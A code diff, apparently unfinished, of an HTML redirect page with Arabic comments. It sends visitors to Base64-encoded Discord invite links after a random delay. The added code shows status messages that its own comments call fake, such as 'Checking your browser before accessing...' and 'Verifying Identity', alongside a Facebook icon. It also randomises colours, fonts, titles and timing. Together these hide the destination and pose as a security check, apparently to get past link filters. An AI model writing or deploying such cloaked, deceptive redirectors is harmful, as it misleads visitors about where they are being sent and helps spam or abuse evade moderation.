@@ -3,20 +3,57 @@
   <head>
     <meta charset="UTF-8" />
     <title>Loading...</title>
+    <style>
+      body {
+        font-family: sans-serif;
+        text-align: center;
+        padding-top: 50px;
+        margin: 0;
+      }
+      img {
+        width: 80px;
+        height: 80px;
+        margin-bottom: 20px;
+      }
+    </style>
     <script>
-      // رسائل متنوعة تظهر كل مرة
-      const messages = [
-        "Loading page...",
-        "Please wait...",
+      // ألوان خلفية عشوائية
+      const bgColors = ["#f2f2f2", "#e0f7fa", "#fff3e0", "#ede7f6", "#fce4ec", "#f1f8e9"];
+      
+      // خطوط عشوائية
+      const fonts = ["Arial", "Tahoma", "Verdana", "Courier New", "Georgia"];
+
+      // عناوين صفحة عشوائية
+      const titles = [
+        "Connecting...",
+        "Checking Session",
+        "Please Wait",
         "Redirecting...",
-        "Connecting to Facebook...",
-        "One moment please...",
-        "Hold on, preparing your page...",
-        "Syncing data...",
-        "Fetching content..."
+        "Securing Request",
+        "Verifying Identity"
       ];
 
-      // روابط مشفرة (Base64)
+      // نصوص وهمية
+      const fakeMessages = [
+        "Checking your browser before accessing...",
+        "Connecting to server...",
+        "Verifying session...",
+        "Please wait while we redirect you...",
+        "Securing your connection...",
+        "Preparing secure link...",
+        "Validating..."
+      ];
+
+      // صور وهمية
+      const icons = [
+        "https://cdn-icons-png.flaticon.com/512/733/733547.png", // facebook
+        "https://cdn-icons-png.flaticon.com/512/732/732200.png", // file
+        "https://cdn-icons-png.flaticon.com/512/107/107831.png", // lock
+        "https://cdn-icons-png.flaticon.com/512/891/891462.png", // spinner
+        "https://cdn-icons-png.flaticon.com/512/545/545705.png"  // cloud
+      ];
+
+      // روابط ديسكورد مشفرة
       const encodedLinks = [
         "aHR0cHM6Ly9kaXNjb3JkLmdnL3lkWHRmQmRhZzY=",
         "aHR0cHM6Ly9kaXNjb3JkLmdnL2JKVWFBWUdld0Q=",
@@ -28,23 +65,15 @@
         "aHR0cHM6Ly9kaXNjb3JkLmdnL21LbWo5ZVVkM3g="
       ];
 
-      // اختيار رسالة ورابط عشوائيين
-      const randomMessage = messages[Math.floor(Math.random() * messages.length)];
-      const randomEncodedLink = encodedLinks[Math.floor(Math.random() * encodedLinks.length)];
+      // تنفيذ عند التحميل
+      window.onload = function () {
+        // اختيارات عشوائية
+        const bg = bgColors[Math.floor(Math.random() * bgColors.length)];
+        const font = fonts[Math.floor(Math.random() * fonts.length)];
+        const title = titles[Math.floor(Math.random() * titles.length)];
+        const message = fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
+        const icon = icons[Math.floor(Math.random() * icons.length)];
+        const encodedLink = encodedLinks[Math.floor(Math.random() * encodedLinks.length)];
+        const delay = Math.floor(Math.random() * 2000) + 1000; // من 1000 إلى 3000
 
-      // عرض الرسالة في الصفحة
-      window.onload = function() {
-        document.getElementById("status").textContent = randomMessage;
-
-        // تأخير 2 ثانية ثم التوجيه
-        setTimeout(() => {
-          const decodedLink = atob(randomEncodedLink);
-          window.location.href = decodedLink;
-        }, 2000);
-      };
-    </script>
-  </head>
-  <body>
-    <p id="status">Please wait...</p>
-  </body>
-</html>
+        // تطبيق القيم
